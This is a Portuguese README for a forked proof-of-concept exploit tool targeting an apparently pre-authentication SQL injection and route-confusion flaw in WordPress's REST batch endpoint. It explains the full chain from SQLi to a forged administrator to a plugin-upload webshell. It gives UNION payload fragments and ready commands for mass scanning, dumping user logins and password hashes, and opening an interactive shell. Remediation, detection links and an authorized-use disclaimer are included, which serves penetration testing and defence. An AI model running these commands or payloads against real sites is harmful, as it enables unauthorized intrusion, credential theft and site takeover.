<p align="center">
  <img src="caramelo.jpeg" alt="Caramelo Storm" width="160">
</p>

<h1 align="center">wp2shell-poc</h1>

<p align="center">
  <strong>PoC independente para a SQLi pré-auth do WordPress REST batch route-confusion (wp2shell).</strong><br>
  Fork ajustado com suporte a <code>-k</code> (TLS skip) e fix no UNION read que causava timeout em alvos com muitos posts.
</p>

<p align="center">
  <em>Ajustes por <strong>Avocado</strong> · equipe <strong>Caramelo Storm</strong></em><br>
  <a href="https://www.linkedin.com/in/rafael-raugi/">💼 LinkedIn</a> ·
  <a href="https://www.youtube.com/@avocado-shell">📺 YouTube @avocado-shell</a>
</p>

---

PoC baseada na [wp2shell-poc original do Icex0](https://github.com/Icex0/wp2shell-poc), associada ao advisory
da Searchlight Cyber. `check` confirma a SQLi, `read` demonstra leitura do banco, e `shell` abre um shell
via plugin upload — com credenciais de admin ou usando a bridge SQLi-to-admin pré-autenticada.

![wp2shell — comando shell exercitando a bridge SQLi-to-admin pré-auth](docs/shell.svg)

**Detecção / IoCs:** Elastic Security Labs e Eye Security publicaram guidance de detecção para essa cadeia.
Veja o [write-up da Elastic](https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend)
e o [guia para defensores da Eye Security](https://labs.eye.security/wp2shell-defenders-guide/).

## O que foi ajustado neste fork

### 1. Flag `-k` / `--insecure` — skip de verificação TLS

Alvos em lab ou engajamentos internos frequentemente usam certificados self-signed ou expirados.
A PoC original rejeitava essas conexões. Agora, `-k` desabilita a verificação de certificado em
**todos** os comandos (`check`, `read`, `shell`), propagando um `ssl.SSLContext` com
`check_hostname=False` e `verify_mode=CERT_NONE` para cada `urllib` opener.

```bash
./wp2shell.py check https://target -k
./wp2shell.py read  https://target -k --preset users
./wp2shell.py shell https://target -k -i
```

### 2. Fix no UNION read — `AND 1=0` mata a query base

O payload UNION original retornava a row forjada **junto** com até 500 posts reais (por causa do
`per_page=500`). Em alvos com muitos posts, o WordPress renderizava shortcodes e embeds de cada um,
causando timeout. O fix adiciona `AND 1=0` antes do `UNION SELECT`, matando a query base para que
**apenas** a row forjada seja retornada/renderizada.

```
-- antes (timeout em sites com muitos posts)
0) UNION SELECT <columns>-- -

-- depois (retorna só a row forjada)
1) AND 1=0 UNION SELECT <columns>-- -
```

## Versões afetadas

| Range de versões | Status |
| ---------------- | ------ |
| <= 6.8.5 | Não afetado |
| 6.9.0 – 6.9.4 | Afetado |
| 7.0.0 – 7.0.1 | Afetado |

## Como funciona

O endpoint REST batch (`/batch/v1`) é não-autenticado e roda vários sub-requests em uma chamada,
confiando que cada sub-request valida suas próprias permissões.

`serve_batch_request_v1()` constrói dois arrays paralelos — `$matches` (handler por sub-request)
e `$validation` (resultado da validação por sub-request) — e indexa ambos pelo mesmo offset no
dispatch. Um sub-request cujo path falha no `wp_parse_url()` é adicionado ao `$validation` mas
**não** ao `$matches`, desalinhando os arrays — um sub-request é despachado sob o handler de
**outro**. Essa é a route confusion.

A PoC empilha o primitivo duas vezes:

1. Um `POST /wp/v2/posts` com body `requests` é despachado sob o batch handler. Validado como
   request de posts, sua lista de `requests` nunca é checada contra o schema do batch — seus
   sub-requests podem usar `GET` (bypass do allow-list de métodos).
2. Dentro desse batch interno, um `GET /wp/v2/posts/999999` carrega params de collection como
   `author_exclude`, `orderby` e `per_page`. O desync despacha sob `get_items()`, onde
   `author_exclude` mapeia para `author__not_in`, que a build vulnerável interpola direto no SQL.

Resultado: **blind SQLi (boolean + time-based) alcançável sem autenticação**.

A cadeia RCE completa:

1. UNION fake rows em `wp_posts` para renderizar conteúdo controlado pelo atacante.
2. Forçar o WordPress a criar posts reais de cache oEmbed.
3. Recuperar os IDs desses posts via SQLi.
4. Num batch envenenado, reinterpretar esses IDs como changeset do customizer + navigation item.
5. Mesmo request alcança `POST /wp/v2/users`, criando um administrador.
6. Login como admin gerado → plugin upload → execução de comando.

Passos 1–5 são pré-autenticação; o passo 6 usa admin plugin upload autenticado.

## Requisitos

- Python 3.8+
- Apenas standard library — **sem dependências externas**

## Uso

```bash
./wp2shell.py <comando> <url> [opções]
```

Ou `pip install .` para ter o comando `wp2shell` no `PATH`.

### check — verificação não-destrutiva

Imprime markers passivos do WordPress e hints de versão, depois envia um probe batch benigno.
Uma implementação vulnerável retorna HTTP 207 com o padrão de route confusion:
`parse_path_failed`, `block_cannot_read` e `rest_batch_not_allowed`.

Use `--confirm-sqli` para uma confirmação ativa via payload SQLi (UNION primeiro, fallback timing).

```bash
./wp2shell.py check http://target
./wp2shell.py check http://target -k              # com TLS skip
./wp2shell.py check targets.txt                    # scan em massa (um URL por linha)
```

### read — extração de dados via SQLi

```bash
./wp2shell.py read http://target                           # fingerprint do servidor
./wp2shell.py read http://target --preset users            # logins e hashes
./wp2shell.py read http://target --query "SELECT @@version"
./wp2shell.py read http://target -k --preset users         # com TLS skip
```

Técnicas de extração (`--technique auto` por padrão):

| Técnica | Como funciona | Custo |
| ------- | ------------- | ----- |
| `union` | Forja row fake via `UNION`, lê título como `\|\|HEX(value)\|\|` | 1 request/valor |
| `error` | `EXTRACTVALUE`/`UPDATEXML`, precisa de erros MySQL visíveis | ~15 bytes/request |
| `blind` | Binary search booleano, lê header `X-WP-Total` como sinal | ~8 requests/char |

### shell — execução de comando

```bash
# com credenciais de admin
./wp2shell.py shell http://target --user admin --password '<hash>' --cmd id
./wp2shell.py shell http://target --user admin --password '<hash>' -i

# via bridge pré-auth (SQLi → admin → plugin shell)
./wp2shell.py shell http://target --cmd id
./wp2shell.py shell http://target -i
./wp2shell.py shell http://target -k -i           # com TLS skip
```

O webshell é removido automaticamente. Quando a bridge pré-auth cria um admin, a conta gerada
é removida automaticamente ao final da sessão.

## Opções

| Opção | Aplica-se a | Descrição |
| ----- | ----------- | --------- |
| `-k`, `--insecure` | todos | Ignora verificação de certificado TLS (self-signed/expirado) |
| `--proxy URL` | todos | Roteia tráfego por proxy HTTP (ex.: Burp) |
| `--timeout N` | todos | Timeout de request em segundos (padrão: 15) |
| `--sleep N` | check | Delay usado pelo fallback de timing do `--confirm-sqli` |
| `--samples N` | check | Pares de timing usados pelo fallback do `--confirm-sqli` |
| `--confirm-sqli` | check | Envia payload ativo de confirmação SQLi |
| `--preset` | read | `fingerprint` ou `users` |
| `--technique` | read | `auto` (padrão), `union`, `error` ou `blind` |
| `--query` | read | Expressão SQL escalar para leitura |
| `--prefix` | read | Prefixo das tabelas (padrão: `wp_`) |
| `--max-length N` | read | Máximo de chars lidos por valor (padrão: 128) |
| `--user` / `--password` | shell | Credenciais de admin; omita ambos para usar a bridge pré-auth |
| `--cmd` | shell | Comando para executar (omita quando usar `-i`) |
| `-i`, `--interactive` | shell | Abre shell interativo após deploy |

## Estrutura

```
wp2shell.py          launcher standalone
wp2shell/
  ├── cli.py         parser e comandos (check, read, shell)
  ├── client.py      BatchClient — HTTP + batch requests
  ├── sqli.py        primitivos SQLi (union, error, blind)
  ├── exploit.py     PreAuthAdminCreator — bridge SQLi-to-admin
  ├── shell.py       AdminSession — login, plugin upload, webshell
  └── version.py     detecção passiva de versão
pyproject.toml       pip install .
```

## Remediação

Atualize para **WordPress 7.0.2**, ou **6.9.5** se estiver no branch 6.9. Até lá, bloqueie
`/wp-json/batch/v1` e o query parameter `rest_route=/batch/v1` no edge, ou exija autenticação
para o endpoint batch via filtro `rest_pre_dispatch`.

## Referências

- WordPress 7.0.2 release — <https://wordpress.org/news/2026/07/wordpress-7-0-2-release/>
- Searchlight Cyber wp2shell advisory — <https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/>
- Hackify — análise técnica do wp2shell — <https://hackify.nl/en/blog/wp2shell-wordpress-core-rce/>
- sergiointel/wp2shell-poc (bridge SQLi-to-admin) — <https://github.com/sergiointel/wp2shell-poc>
- Icex0/wp2shell-poc (PoC original deste fork) — <https://github.com/Icex0/wp2shell-poc>
- Elastic Security Labs — detecção e IoCs — <https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend>
- Eye Security — guia para defensores — <https://labs.eye.security/wp2shell-defenders-guide/>

## Aviso

Ferramenta para **testes de segurança autorizados**. Use exclusivamente contra sistemas que você
possui ou tem **permissão explícita por escrito** para testar. Nenhuma garantia é fornecida e
nenhuma responsabilidade é aceita por uso indevido.

## Licença

[MIT](LICENSE)

---

<p align="center">
  <sub>⚡ <strong>Caramelo Storm</strong> ·
  <a href="https://www.linkedin.com/in/rafael-raugi/">LinkedIn</a> ·
  <a href="https://www.youtube.com/@avocado-shell">YouTube @avocado-shell</a></sub>
</p>
